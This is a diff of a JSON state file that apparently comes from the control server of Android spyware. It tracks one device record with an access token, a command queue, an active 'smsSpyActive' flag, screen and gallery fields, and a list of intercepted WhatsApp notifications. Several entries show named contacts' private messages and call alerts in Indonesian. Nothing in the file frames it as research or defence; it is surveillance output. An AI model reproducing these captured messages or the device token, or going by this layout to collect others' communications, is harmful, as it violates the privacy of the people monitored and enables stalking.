@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776958371236,
+    "lastSeen": 1776958377242,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776958379048
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776958378978
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 41 chat",
+        "time": "23/04 23:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776958378502
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776958373005
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776958372972
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3979,46 +4019,6 @@
         "time": "23/04 21:41",
         "pkg": "com.whatsapp",
         "receivedAt": 1776951720278
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "Telepon video berlangsung",
-        "time": "23/04 21:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951717227
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "Berdering…",
-        "time": "23/04 21:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951710030
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "Memanggil…",
-        "time": "23/04 21:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951708139
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎62 pesan dari 41 chat",
-        "time": "23/04 21:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951661879
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Maya",
-        "content": "aku tadi pas dibilang jangan chat ga aku chat",
-        "time": "23/04 21:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951661553
       }
     ],
     "galleryPhotos": [],
